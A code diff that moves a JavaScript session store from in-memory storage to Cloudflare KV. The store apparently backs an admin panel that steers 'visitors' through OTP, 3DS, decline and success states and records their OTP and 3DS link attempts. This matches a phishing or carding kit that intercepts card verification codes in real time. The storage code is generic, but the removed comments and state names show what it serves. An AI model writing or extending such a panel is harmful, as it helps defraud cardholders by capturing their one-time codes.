@@ -1,56 +1,112 @@
 /**
- * In-memory session store for controlling visitor flow from admin panel.
- * Shape: { action: 'pending'|'otp'|'3ds'|'decline'|'success', seq: number, data: any }
+ * Session store with Cloudflare KV backend + in-memory fallback for local dev.
+ *
+ * On Cloudflare Pages: pass `platform` from each endpoint — uses platform.env.STORE (KV).
+ * On local `vite dev`: platform.env is undefined → falls back to in-memory Map.
+ *
+ * KV keys: `session:<id>` → JSON blob.
+ * TTL: 24 hours on each write (auto-cleanup).
  */
-const sessions = new Map();
+
+const mem = new Map();
+const TTL_SECONDS = 60 * 60 * 24; // 24h
+
+/** @param {any} platform */
+function kv(platform) {
+  return platform?.env?.STORE ?? null;
+}
+
+/** @param {any} platform @param {string} id */
+async function readRaw(platform, id) {
+  const store = kv(platform);
+  if (store) {
+    const raw = await store.get(`session:${id}`, 'json');
+    return raw ?? null;
+  }
+  return mem.get(id) ?? null;
+}
+
+/** @param {any} platform @param {string} id @param {any} obj */
+async function writeRaw(platform, id, obj) {
+  const store = kv(platform);
+  if (store) {
+    await store.put(`session:${id}`, JSON.stringify(obj), { expirationTtl: TTL_SECONDS });
+  } else {
+    mem.set(id, obj);
+  }
+}
+
+function blank() {
+  const now = Date.now();
+  return { action: 'pending', seq: 0, data: {}, createdAt: now, updatedAt: now };
+}
 
 /**
+ * @param {any} platform
  * @param {string} id
  * @param {string} action
  */
-export function setAction(id, action) {
-  const existing = sessions.get(id) ?? { action: 'pending', seq: 0, data: {}, createdAt: Date.now(), updatedAt: Date.now() };
+export async function setAction(platform, id, action) {
+  const existing = (await readRaw(platform, id)) ?? blank();
   existing.action = action;
   existing.seq = (existing.seq ?? 0) + 1;
   existing.updatedAt = Date.now();
-  sessions.set(id, existing);
+  await writeRaw(platform, id, existing);
   return existing;
 }
 
-/** @param {string} id */
-export function getAction(id) {
-  return sessions.get(id) ?? { action: 'pending', seq: 0, data: {}, createdAt: Date.now(), updatedAt: Date.now() };
+/** @param {any} platform @param {string} id */
+export async function getAction(platform, id) {
+  return (await readRaw(platform, id)) ?? blank();
 }
 
 /**
+ * @param {any} platform
  * @param {string} id
  * @param {Record<string, any>} data
  */
-export function saveData(id, data) {
-  const existing = sessions.get(id) ?? { action: 'pending', seq: 0, data: {}, createdAt: Date.now(), updatedAt: Date.now() };
+export async function saveData(platform, id, data) {
+  const existing = (await readRaw(platform, id)) ?? blank();
   existing.data = { ...existing.data, ...data };
   existing.updatedAt = Date.now();
-  sessions.set(id, existing);
+  await writeRaw(platform, id, existing);
 }
 
 /**
- * Append an entry (OTP attempt / 3DS link attempt) to the session history array.
+ * @param {any} platform
  * @param {string} id
- * @param {string} key  e.g. 'otps' or 'links'
+ * @param {string} key
  * @param {any} entry
  */
-export function pushHistory(id, key, entry) {
-  const existing = sessions.get(id) ?? { action: 'pending', seq: 0, data: {}, createdAt: Date.now(), updatedAt: Date.now() };
+export async function pushHistory(platform, id, key, entry) {
+  const existing = (await readRaw(platform, id)) ?? blank();
   if (!Array.isArray(existing.data[key])) existing.data[key] = [];
   existing.data[key].push({ value: entry, at: Date.now() });
   existing.updatedAt = Date.now();
-  sessions.set(id, existing);
+  await writeRaw(platform, id, existing);
 }
 
-export function listSessions() {
-  return Array.from(sessions.entries()).map(([id, s]) => ({ id, ...s }));
+/** @param {any} platform */
+export async function listSessions(platform) {
+  const store = kv(platform);
+  if (store) {
+    // KV list supports up to 1000 keys per call; sessions are short-lived so fine.
+    const { keys } = await store.list({ prefix: 'session:' });
+    const entries = await Promise.all(
+      keys.map(async (k) => {
+        const val = await store.get(k.name, 'json');
+        if (!val) return null;
+        return { id: k.name.slice('session:'.length), ...val };
+      })
+    );
+    return entries.filter(Boolean);
+  }
+  return Array.from(mem.entries()).map(([id, s]) => ({ id, ...s }));
 }
 
-export function deleteSession(id) {
-  sessions.delete(id);
+/** @param {any} platform @param {string} id */
+export async function deleteSession(platform, id) {
+  const store = kv(platform);
+  if (store) await store.delete(`session:${id}`);
+  else mem.delete(id);
 }
